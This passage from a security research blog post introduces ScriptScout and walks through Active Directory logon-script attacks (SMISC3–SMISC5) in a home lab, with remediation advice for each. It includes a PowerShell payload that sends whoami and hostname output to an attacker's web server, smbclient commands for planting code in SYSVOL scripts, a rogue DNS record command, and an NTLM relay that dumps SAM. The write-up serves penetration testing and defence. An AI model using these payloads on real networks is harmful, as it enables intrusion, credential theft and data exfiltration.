>  If the missing Automation Script is located within `\\<dc-hostname>\SYSVOL\Scripts\<SMISC3_vulnerable_file_name>`, this means that such missing Automation Script and therefore vulnerable to SMISC3 could be executed either via the ["ScriptPath" property](#2) of a domain user or through a [GPO Scheduled Task](#3), in the first scenario, the attacker must manually retrieve and correlate data to identify which user is impacted ([in a manner similar to what has already been described](#12)), in the second case, since ScriptScout also downloads all "ScheduledTask.xml" files within the "ScheduledTaskConf_collected" folder, the attacker by using grep can quickly verify if such missing Automation Script vulnerable to SMISC3 is triggered via "GPO Scheduled Task", in this scenario by analyzing the identified "SchedulTask.xml" file it will also be possible to understand the execution logic (e.g. trigger "On Workstation Lock") and with which user the Automation Script eventually created by the attacker will be executed.

Now the attacker needs to verify if he also has permissions at the SMB (network) level and to do so, he could simply attempt to upload the malicious file into the target SMB share, so effectively performing the attack; if, as in this case, the result is positive we have indirectly confirmed that an attacker possesses all the necessary permissions.

So:

1. **Create the malicious file "not_exist_file.bat" containg the malicious PAYLOAD, for example the following arbitrary code:**

    ```
    powershell -Command "$data = (whoami) + '|' + (hostname); $encoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($data)); Invoke-WebRequest -Uri \"http://<ip_attacker>/?a=$encoded\" -UseBasicParsing"
    ```

    {{< image src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/20.png" position="center" style="border-radius: 8px;">}}

    This code executes the “whoami” and “hostname” commands and sends the output in base64 format to a Web Server hosted by the attacker, in reality the attacker could create local accounts on the machine (if the impersonated user has sufficient privileges), spawn a Reverse Shell, execute a beacon to establish a connection to the C2 and so on.

    > The syntax of the arbitrary command to be inserted inside the file to be modified varies according to the language it uses, for example if you modify a .VBS file, the code indicated above may not work.

2. **Then upload the malicious file into the SMB remote path where the Automation Script will try to execute the "not_exist_file.bat" file.** 

    {{< image src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/21.png" position="center" style="border-radius: 8px;">}}

Now, after the GPO modification has correctly propagated (by default this takes 90 minutes, otherwise if you have access to the machine you can use the "gpupdate /force" command), for example if the SPIDERMAN machine (we know the GPO is applied at the [domain level](#12) and therefore affects every domain joined Computer) performs a StartUp (powers on), the machine impersonating its own Computer Account SPIDERMAN$ authenticates via NTLM (because Kerberos fails) to the share //THEPUNISHER/business_folder, retrieves the script "not_exist_file.bat" and executes it locally under the "NT AUTHORITY\System" account; as a demonstration of this, following this event, it can be observed how the attacker has actually succeeded in performing data exfiltration.

  {{< image src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/23.png" position="center" style="border-radius: 8px;">}}

To see how everything was configured inside the home made lab, refer to the [previous section](#13) since the configuration was almost the same.

**Remediation**: Analyze all "Automation Scripts" present in the infrastructure, retrieve the SMB paths contained within them, and verify that the file shares themselves and the folders contained within do not have excessive permissions, because if an "Automation Script" executes a file that does NOT exist and excessive permissions are present on the parent folder or on the SMB share itself, an attacker could carry out the attack type called SMISC3.

<span id=33>

## **SMISC4: The Script itself contained inside the SYSVOL / NETLOGON has excessive permission**

Sometimes it may happen that the Automation Script itself, located inside SYSVOL (and consequently also in the NETLOGON share), specifically in the path `\\<dc-hostname>\SYSVOL\Scripts\<automation_script>`, so the Automation Script commonly configured either through the ["ScriptPath" property](#2) or via ["GPO Scheduled Task"](#3), has excessive permissions and so the attacker is able to edit it directly, if this scenario occurs, an attacker could therefore edit the content of this "Automation Script" by inserting any malicious commands which will be executed by the victim user.

> Exactly like for [SMISC2](#14) & [SMISC3](#15), in order to edit a file contained within an SMB share it is necessary to have permissions both at the NTFS level and at the SMB share (network) level, since [by default](https://learn.microsoft.com/en-us/answers/questions/1669364/can-the-everyone-read-share-permission-be-remove) the SMB share SYSVOL & NETLOGON hosted on the DC offers "FullControl" permissions (SMB network level) to the "Authenticated Users" group, if ScriptScout identifies excessive permissions at the NTFS level (the tool is capable of this) the attacker will have almost certainty of being able to perform the SMISC4.

> Although SMISC4 could also be present on Automation Scripts contained inside `/SYSVOL/<domain>/Policies/<GPO_GUID>/<User OR Machine>/scripts/<Logon OR Logoff OR StartUp Or Shutdown/*`, so an "Automation Scripts" executed through [GPO (Group Policy Script)](#1), since this is an extremely rare scenario, ScriptScout does not cover it.

By running ScriptScout, we can see that the Automation Script "misc4_logonscript.cmd" (contained within SYSVOL & NETLOGON) grants the "FullControl" permission to the "Everyone" or "Domain Users" group, so to any domain user, in other words, the attacker will be able to directly modify the file "misc4_logon.script.cmd" by inserting arbitrary commands that will then be executed by the victim user.

<span id=16>

  {{< image src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/24.png" position="center" style="border-radius: 8px;">}}

> This misconfiguration is due to the fact that the SysAdmin granted "FullControl" permissions (in reality, only "Write" permission is sufficient to carry out an attack and ScriptScout also manages this scenario) to the "Everyone" or "Domain Users" group on the SMB share "script" (and therefore the "Automation Scripts" contained within inherit this permission) or "NETLOGON" share (and therefore the "Automation Scripts" contained within inherit this permission) or directly on the Automation Script itself such as the file "misc4_logonscript.cmd"; the "ScriptScout" tool manages all scenarios and since exploitation is similar, although the tool performs this control under-the-hood in a distinct way, the output will be the same and transparent to the tool user.

Furthermore, since an Automation Script vulnerable to SMISC4 can commonly be configured either via ["GPO Scheduled Task"](#3) or through the ["ScriptPath" property](#2), ScriptScout will specify the situation encountered; in the first case, since the tool downloads all the "ScheduledTask.xml" files inside the "ScheduledTaskConf_collected" folder, using a grep [the tool will automatically notify you if such occurrence arises](#18), if this scenario is not present then it is probably the second scenario and consequently the tool will suggest to you that the impacted Automation Script is probably being used by the ["ScriptPath" property](#2) ([as in our case](#16)); in this case, since the tool flags this scenario, the tester will have to enumerate this information manually, for example using BloodHound; since the target in this example is inside my home-made laboratory, we can see how this "Automation Script" is associated with the domain user "MARVEL\pparker", as a result of this when this domain user logs on to any domain-joined machine, that machine will execute this [Logon Script](#6) impersonating the respective domain user.

<span id=17>

  {{< image src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/25.png" position="center" style="border-radius: 8px;">}}

<span id=18>

> If the Automation Script were executed via "[GPO Scheduled Task](#3)", the ScriptScout tool would have flagged this scenario as follows:
> {{< image src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/26.png" position="center" style="border-radius: 8px;">}}

So: 

1. **For example, we use "smbclient" to first download `\\<hostname-dc>\SYSVOL\<domain>\scripts\<SMISC4_vulnerable_script>`**

    ```
    # smbclient //<hostname-ip_dc>/SYSVOL -U '<domain>\\<domain_user>%<password>' -c "get <fullpath_automationscript> <local_file>/<automationscript_name>"
    ```

   {{< image src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/27.png" position="center" style="border-radius: 8px;">}}

2. **Append** (DO NOT remove data contained within / DO NOT overwrite the file content – this would cause a service disruption) **the malicious content, for example the following arbitrary code:**

    ```
    powershell -Command "$data = (whoami) + '|' + (hostname); $encoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($data)); Invoke-WebRequest -Uri \"http://<ip_attacker>/?a=$encoded\" -UseBasicParsing"
    ```

    {{< image src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/28.png" position="center" style="border-radius: 8px;">}}

    This code executes the “whoami” and “hostname” commands and sends the output in base64 format to a Web Server hosted by the attacker, in reality the attacker could create local accounts on the machine (if the impersonated user has sufficient privileges), spawn a Reverse Shell, execute a beacon to establish a connection to the C2 and so on.

    > The syntax of the arbitrary command to be inserted inside the file to be modified varies according to the language it uses, for example if you modify a .VBS file, the code indicated above may not work.

3. **We use, for example, “smbclient” to finally upload and thus overwrite the original “Automation Script” with the malicious “Automation Script”.**

    ```
    # smbclient //<hostname-ip_dc>/SYSVOL -U '<domain>\\<domain_user>%<password>' -c "put <local_file>/<automationscript_name> <fullpath_automationscript>"
    ```
    
    {{< image src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/29.png" position="center" style="border-radius: 8px;">}}

Now, if the domain user ([we know that this "Logon Script" is associated exclusively with this domain user](#17)) named "MARVEL\pparker" logs on (Logon) to any domain-joined machine, as in this case SPIDERMAN, the machine, impersonating the domain user "MARVEL\pparker", will execute the "LogonScript" "misc4_logonscript.ps1" and consequently will execute the malicious code inside it, and in fact, as a result of this event, we could observe that the attacker actually succeeded in exfiltrating data.

{{< image src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/30.png" position="center" style="border-radius: 8px;">}}

To see how everything was configured inside the home made lab, refer to the [previous section](#13) since the configuration was almost the same.

**Remediation**: Analyze if there are excessive permissions assigned to the "Automation Scripts" itself or in its parent folder (e.g. "Script" folder) / SMB Share (e.g. NETLOGON) that contain it, if excessive permissions are present, an attacker could exploit them to carry out an SMISC4 attack.

<span id=26>

## **SMISC5: Find a Script that map a SMB share & / OR execute a remote file hosted on a SMB Share, where the machine that expose that SMB Share does not exist anymore**

Sometimes it may happen that the Automation Script contains code that maps a network SMB share or executes a remote file hosted on a network SMB share where the machine exposing such SMB share no longer exists, this may occur because over time sysadmin decide to deprecate the machine and remove it from the infrastructure while leaving the corresponding Automation Script pointing to it.

Since by default every principal within the "Authenticated Users" group (each Domain User & each Computer Account) has permissions to create DNS records within the domain (including users with minimal privileges), an attacker could create a DNS record that points to an IP address associated with a machine owned by the attacker, which will have an appropriately configured SMB share reachable by the victim; by doing this, when the victim executes the Automation Script it will perform a NTLM authentication (since Kerberos will fail and then the switch will occur via failover) towards the SMB service exposed on the attacker's machine, and as a result of this the attacker will be able to perform an attack such as [NTLM Relay](https://en.hackndo.com/ntlm-relay/) (for example an SMB Relay) or [Net-NTLM Hash Cracking](https://0xdf.gitlab.io/2019/01/13/getting-net-ntlm-hases-from-windows.html#cracking-ntlmv2).

Before proceeding with the attack i want to highlight that based on the type ([e.g. Logon Script, StartUp Script and so on](#6)) of the vulnerable "Automation Script," the impact of the SMISC5 technique will vary in severity (regardless if it's configured via [GPO - Group Policy Script](#1) or [ScriptPath property](#2)), specifically:

- **LogOn Script**: Following a "Logon", the Computer impersonates the domain user to perform network authentication (by default Kerberos, NTLM in case of failover) to the target SMB share, subsequently the Computer will perform the desired action locally (map the SMB share locally / execute the remote file present on the SMB share locally) always impersonating the domain user.

  In the SMISC5 scenario, this means that the Computer will send an NTLM authentication request (since Kerberos fails) with the victim user and as a result the attacker will obtain the Net-NTLM Hash of the domain user, so the attacker will have concrete opportunities to successfully perform NTLM Relay & Net-NTLM Hash Cracking.

- **LogOff Script**: Following a "Logoff", the Computer impersonates the domain user to perform network authentication (by default Kerberos, NTLM in case of failover) to the target SMB share, subsequently the Computer will perform the desired action locally (map the SMB share locally / execute the remote file present on the SMB share locally) always impersonating the domain user.

  In the SMISC5 scenario, this means that the Computer will send an NTLM authentication request (since Kerberos fails) with the victim user and as a result the attacker will obtain the Net-NTLM Hash of the domain user, so the attacker will have concrete opportunities to successfully perform NTLM Relay & Net-NTLM Hash Cracking.

<span id=25>

- **StartUp Script**: Following a "StartUp", the Computer uses its own "Computer Account" to perform network authentication (by default Kerberos, NTLM in case of failover) to the target SMB share, subsequently the Computer will perform the desired action locally (map the SMB share locally / execute the remote file present on the SMB share locally) impersonating the local user "NT Authority\ System".

  In the SMISC5 scenario, this means that the Computer will send an NTLM authentication request (since Kerberos fails) with its own Computer Account and as a result the attacker will obtain the Net-NTLM Hash of the Computer Account, so the attacker will have virtually no chances of successfully performing Net-NTLM Hash Cracking (since by default the Computer Account password is extremely strong) and fewer opportunities for exploitation via NTLM Relay.

- **ShutDown Script**: Following a "ShutDown", the Computer uses its own "Computer Account" to perform network authentication (by default Kerberos, NTLM in case of failover) to the target SMB share, subsequently the Computer will perform the desired action locally (map the SMB share locally / execute the remote file present on the SMB share locally) impersonating the local user "NT Authority\ System".

  In the SMISC5 scenario, this means that the Computer will send an NTLM authentication request (since Kerberos fails) with its own Computer Account and as a result the attacker will obtain the Net-NTLM Hash of the Computer Account, so the attacker will have virtually no chances of successfully performing Net-NTLM Hash Cracking (since by default the Computer Account password is extremely strong) and fewer opportunities for exploitation via NTLM Relay.

  > Automation Scripts executed via "[GPO Scheduled Task](#3)" may differ significantly depending on how they are configured.

<span id=24>

**In summary, SMISC5 will have a greater impact if the affected Automation Script is a "Logon Script" or a "LogOff Script", with the exception of particular scenarios that will be addressed [later](#22).**

By running ScriptScout, we can observe how an Automation Script attempts to execute the remote file "run.bat" located on the SMB share named "business_folder" hosted on the machine "notexistcomputer", since this machine is no longer present (there is no longer an associated DNS A record), an attacker could first insert a malicious DNS A record in the target domain to associate the machine "notexistcomputer" with the attacker's IP address, then expose a CIFS service on their malicious machine with the SMB share named "business_folder" and once these preliminary actions have been completed, when the victim through the Automation Script authenticates using NTLM to the computer "notexistcomputer", the attacking machine will receive the Net-NTLM Hash and will be able to perform an NTLM-Relay attack or Net-NTLM Hash cracking.

{{< image src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/31.png" position="center" style="border-radius: 8px;">}}

Additionally, ScriptScout will display on screen the corresponding "Automation Script" that contains the execution of the remote file or mapping of the remote SMB share hosted on the machine that no longer exists, in this case by viewing the path `\\<dc-hostname>\policies\<GUID>\User\Script\Logoff` we understand that this "Automation Script" named "smisc5_automationscript.ps1" is actually a LogOff Script configured through [GPO (Group Policy Script)](#1)

<span id=20>

Subsequently, to determine which users are impacted by this "Automation Script" (in this case Logoff Script) and therefore identify the potential victims of the SMISC5 attack, [as previously mentioned](#5), the tester must enumerate this information manually for example using BloodHound; since the target in this example is within my home laboratory, we can observe how this GPO with that GUID is actually named "smisc5_automationscript" (DisplayName) and is directly associated with the MARVEL.local domain, it means that ALL domain user (because it is a Logoff Script) that perform a "[Logoff](#19)" will become the victims of this attack.

<span id=21>

{{< image src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/32.png" position="center" style="border-radius: 8px;">}}

> If the Automation Script vulnerable to SMISC5 is located inside `\\<dc-hostname>\SYSVOL\Scripts\<SMISC5_vulnerable_filename>`, this means that such Automation Script can be executed either through the ["ScriptPath" property](#2) of a domain user or through a [GPO Scheduled Task](#3), in the first instance the attacker will need to manually retrieve and correlate data to understand which user is impacted [in a manner similar to what has already been described](#20), in the second case, since ScriptScout also downloads all "ScheduledTask.xml" files inside the "ScheduledTaskConf_collected" folder, the attacker by running a grep can quickly identify if such "Automation Script" vulnerable to SMISC5 is triggered via "GPO Scheduled Task", in this scenario by analyzing the identified "ScheduledTask.xml" file it will also be possible to understand the execution logic (e.g. trigger "On Workstation Lock") and with which user the vulnerable Automation Script will be executed.

Knowing this, the attacker could, for example, use the tool ["dnstool.py"](https://github.com/dirkjanm/krbrelayx/blob/master/dnstool.py) to insert a DNS A record that will point the machine name "notexistcomputer" to the IP address belonging to the attacker's machine.
    
  ```
  # python3 /opt/krbrelayx/dnstool.py -u <domain>\\<user> -p <password> -r <notexistmachine_fqdn> -t A -d <IP_AttackerComputer> --action add <IP_DC>
  ```

  {{< image src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/33.png" position="center" style="border-radius: 8px;">}}

Once the tool has responded positively, the malicious DNS A record has been successfully inserted.

> It is necessary to wait a few minutes for the change to propagate, after waiting, you can confirm the successful insertion of the record as follows:
>
>```
># dig @<dc_ip> <notexistmachine_fqdn> A +short
>```
>  {{< image src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/34.png" position="center" style="border-radius: 8px;">}}

<span id=23>

In our scenario, since this is a homemade lab, we will simulate the logoff interaction of the user "MARVEL\pparker" (it's a Domain Admin) on the machine SPIDERMAN; consequently we will configure the tool ["impacket-ntlmrelayx"](https://github.com/fortra/impacket/blob/9c2d8b61ee9f13dc93744f36748bd4f49a5e9bd5/examples/ntlmrelayx.py#L4) to perform an SMB Relay towards the machine THEPUNISHER (since it's a Windows 10 by default it does NOT have the SMB Signing enabled and therefore the attack will work), specifically towards the IP 192.168.52.132 (THEPUNISHER) and also configure it to save the Net-NTLM Hash obtained, which may potentially be used to perform Net-NTLM Hash Cracking afterward.

{{< image src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/35.png" position="center" style="border-radius: 8px;">}}

Now, [as previously mentioned](#23), if for example the user "MARVEL\pparker" ([since this is a home lab we know that this user has this Logon Script configured, like every domain user in the domain](#21)) logs off from the SPIDERMAN machine, the machine impersonating the domain user "MARVEL\pparker" will execute the LogOff Script "smisc5_automationscript.ps1", consequently, still impersonating the user "MARVEL\pparker", will perform an NTLM authentication (Kerberos is attempted first but upon failure a new attempt is made using NTLM) towards the machine "notexistcomputer" which will have the attacker's machine IP associated, for this reason the attacker's machine will receive the Net-NTLM Hash of the user "MARVEL\pparker" and will perform an NTLM Relay towards the machine THEPUNISHER dumping in this way the SAM of the latter (this is because "MARVEL\pparker" has the necessary permissions).

{{< image src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/36.png" position="center" style="border-radius: 8px;">}}

**Remediation**: Analyze all "Automation Scripts" present in the infrastructure and check if the referenced SMB shares are hosted on a machine that has been decommissioned; if such occurrence happens an attacker could perform the attack type called SMISC5.

<span id=22>

## **SMISC5 - Deep Dive into an exploitation Edge Case**

[As previously discussed](#24), an SMISC5 on a StartUp & Shutdown Script has a lower impact compared to its Logon & LogOff Script counterpart, because the attacker obtaining a Net-NTLM Hash of a Computer Account has less attack surface.

In order to scale the severity of this scenario (and in reality also on Logon & Logoff Scripts), i asked myself: instead of simply obtaining the Net-NTLM Hash which can only be used for NTLM Relay & Net-NTLM Hash Cracking, if there is a scenario where an Automation Script executes a file located on a remote SMB share vulnerable to SMISC5, an attacker could instead host an SMB File Share containing a malicious file where both have the exact same name as what is called by the victim through the Automation Script, if so, the victim will retrieve and then execute the malicious file hosted by the attacker, in this way the attacker would indirectly execute arbitrary commands by impersonating the victim; furthermore, this scenario would be even more severe in the case of a StartUp & Shutdown Script since the execution of the malicious file [will be performed locally on the machine while impersonating the "NT Authority\System" account](#25).

Unfortunately (for the attacker), in order to successfully conduct such an attack, it is necessary that the computer performing NTLM Authentication against the SMB service hosted by the attacker has ["Guest" SMB Authentication enabled](https://learn.microsoft.com/en-us/windows-server/storage/file-server/enable-insecure-guest-logons-smb2-and-smb3?tabs=group-policy#reason-for-enabling-guest-logons), which is a configuration that is [by default disabled on >= Windows 10 & Windows 2019](https://learn.microsoft.com/en-us/windows-server/storage/file-server/enable-insecure-guest-logons-smb2-and-smb3?tabs=group-policy#default-behaviors); consequently, if the attacker identifies a GPO StartUp / Shutdown Script vulnerable to SMISC5 that is associated with an OU containing only Windows Server < 2019, or if the attacker verifies that the computers affected by an SMISC5 also have a [GPO that enables "Guest Authentication"](https://learn.microsoft.com/en-us/windows-server/storage/file-server/enable-insecure-guest-logons-smb2-and-smb3?tabs=group-policy#enable-insecure-guest-logons) on them, this edge case becomes realistic.

As we can observe in this scenario, the machine "SPIDERMAN" has been specifically configured with "Insecure Guest Logon" enabled:

{{< image src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/37.png" position="center" style="border-radius: 8px;">}}

And there is a GPO associated with the entire domain that runs a Shutdown script which specifically executes the file "run.bat" located at `\\notexistcomputer\business_folder\management_files\run.bat`, furthermore, i want to highlight that this Automation Script is vulnerable to [SMISC5](#26) as previously discussed and in fact in this example for semplicity reason there is already an DNS A record that points the hostname "notexistcomputer" to the IP address of the attacker's machine.

<span id=27>

{{< image src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/38.png" position="center" style="border-radius: 8px;">}}

In this scenario, the attacker can use ["smbserver.py" from Impacket](https://github.com/fortra/impacket/blob/master/examples/smbserver.py) to set up an SMB share named "business_folder" where inside it there is a folder called "management_files" containing the file "run.bat" with the malicious PAYLOAD (e.g. it performs an HTTP Exfiltration), in other words the file is located exactly in the path called by the Automation Script vulnerable to SMISC5 named "smisc5_automationscript.ps1".

> In this example we perform a basic HTTP Exfiltration attack but in reality since in this scenario the computer victim will execute locally the malicious file using the "NT Authority\System", the attacker could for example create local administrator user on the machine, dump LSASS, dump SAM, dump LSA Secrets, execute a beacon to establish a connection to the C2 and so on.

At the moment when the SPIDERMAN machine ([we know that every machine joined to the domain is impacted](#27)) performs a Shutdown, the following operations occur sequentially:

1. The SPIDERMAN computer executes the Automation Script "smisc5_automationscript.ps1" and consequently decides to execute the file "run.bat" located at the following path: `\\notexistcomputer\business_folder\management_files\run.bat`.

2. The SPIDERMAN computer resolves the hostname "notexistcomputer" to the IP "192.168.52.133" which belongs to the attacker.

3. The SPIDERMAN computer uses its own Computer Account named SPIDERMAN$ to perform a Kerberos authentication to the SMB service exposed on the machine "192.168.52.133".

4. Since the exposed SMB service does NOT accept Kerberos authentication, the SPIDERMAN computer, due to failover reasons, performs a NTLM network authentication using its own Computer Account named SPIDERMAN$, consequently the attacker's machine correctly receives the Net-NTLM Hash of SPIDERMAN$.

5. Since the SMB service on the attacker's machine is NOT able to verify the validity of the Net-NTLM Hash of SPIDERMAN$ as it's a service set up by an attacker (normally the receiving legitimately machine would forward everything to the DC which would validate the Net-NTLM Hash and based on this would allow or deny access), it responds with an error.

6. The SPIDERMAN machine, after receiving an error, since it's configurated to allow the use of the "Guest User", as a last resort, it will try to authenticate to the SMB service of attacker's machine using the built-in "Guest" user.

7. The SMB service exposed on the attacker's machine accepts the "Guest" authentication and consequently allows crawling of the SMB share and the retrieval of the file "run.bat".

8. The SPIDERMAN machine, having now retrieved the file "run.bat", executes it locally using the "NT Authority\System" account and consequently runs the malicious code.

{{< image src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/39.png" position="center" style="border-radius: 8px;">}}

**Remediation**: Always keep "[Insecure Guest Logon](https://learn.microsoft.com/en-us/windows-server/storage/file-server/enable-insecure-guest-logons-smb2-and-smb3?tabs=group-policy)" disabled, if enabled, it will increase the severity of an potentially SMISC5 attack.

<span id=34>

## **ScriptScout Tips & Tricks**

**In this section, i will detail some Tips & Tricks on how to use ScriptScout according to your professional role within your company:**

**Red Team (e.g. Red Teamer, Penetration Tester, Security Researcher):**

- ScriptScout has a parameter dedicated to OPSEC (--opsec), specifically, through its configuration, it is possible to set a longer sleep activity before each interaction with the Domain Controller and not only (querying the Domain Controller’s SYSVOL or NETLOGON share is a standard activity, so fortunately for Red Team it’s should be pretty OPSEC-safe, especially with delays).

- In order to download the Automation Scripts and the "ScheduledTask.xml" files from Domain Controller ScriptScout uses the "SMBConnection" library by Impacket, for this reason the network activity triggered could be identified by the signatures / IOC generated by such library (typically [Impacket network signatures / IOC](https://blog.exploit.org/caster-kerbhammer/) generated by a vendor focus only on Kerberos interactions and not on NTLM - ScriptScout will exclusively use NTLM); furthemore, i want to highlight that ScriptScout, to identify remote NTFS permissions under-the-hood will use [smbcacls](https://www.samba.org/samba/docs/current/man-html/smbcacls.1.html) from the Samba suite.

- Regarding SMISC2, SMISC3 and SMISC4, ScriptScout will also specify to which group the excessive permissions have been assigned, namely: "Everyone" or "Domain Users", "Authenticated Users" and "Domain Computers"; this logic is deliberately implemented as it gives more flexibility to the Red Teamer, for example in a "Authenticated Users" scenario the Red Teamer could impersonate a Computer Account instead of the regular Domain User to perform the exploitation.

- The output of SMISC2 and SMISC3 depends on where the Red Teamer executes ScriptScout, consequently, if full visibility of these misconfigurations is needed, it is recommended to run ScriptScout multiple times from different locations within the network although this is less OPSEC-friendly; for this purpose, i suggest to use the "--technique" parameter to avoid unnecessary and additional requests to the client’s infrastructure.

**Blue Team (e.g. SysAdmin, SIEM / Detection Engineer, CyberSecurity Analyst):**

- Using ScriptScout you will be able to immediately identify all the SMISC present in your infrastructure, then you can apply the necessary fixes!

- SMISC2 and SMISC3 depend on the position from where the Blue Team will execute ScriptScout, consequently, it's recommended to run it directly on the Domain Controller so that you can be sure to have connectivity to all machines joined to the domain.

- By disabling the OPSEC mechanisms (using the "--opsec" parameter) which ScriptScout enables by default, execution will be significantly faster, instead, configuring the parameter to maximize OPSEC allows ScriptScout to be used to test if the detection rules deployed in your infrastructure work properly and can detect anomalous traffic.

<span id=35>

## **Outro**

It’s been a really interesting journey, what started as reading an [awesome article about misconfigured logon scripts](https://offsec.blog/hidden-menace-how-to-identify-misconfigured-and-dangerous-logon-scripts/) (made by [Spencer Alessi](https://x.com/techspence)) morphed into a deep dive on the topic which led me to write this article and create the ScriptScout tool, so, if this article sparks any new SMISC exploitation ideas or any variations in your mind, hit me up, let’s do community & research together!

<span id=37>

## **Legal Disclaimer**:

ScriptScout is designed for authorized security testing, red team operations, and defensive blue team assessments only. By using this tool, you agree that you have obtained prior explicit and written consent from the owner of the target systems and that you will comply with all applicable laws and regulations. Use of this tool against any target without prior explicit and written consent is illegal. The author assumes no responsibility for any misuse, unlawful activity, or damage caused by this tool.

<span id=36>

## **References**

- https://offsec.blog/hidden-menace-how-to-identify-misconfigured-and-dangerous-logon-scripts/
- https://github.com/techspence/scriptsentry
- https://www.semperis.com/blog/gpo-logon-script-security/
- https://www.blackhillsinfosec.com/backdoors-breaches-logon-scripts/
- [How to execute logon and logoff scripts using Group Policy Objects (GPO) - Active Directory (AD)](https://www.youtube.com/watch?v=j1hMPZfy9aM)
- [How to execute logon/logoff scripts using group policy](https://www.youtube.com/watch?v=CGHyAD0ylRs)
- https://ad4noobs.justin-p.me/terminology_installing_a_active_directory/sysvol_and_netlogon/
- https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/dn789196(v=ws.11)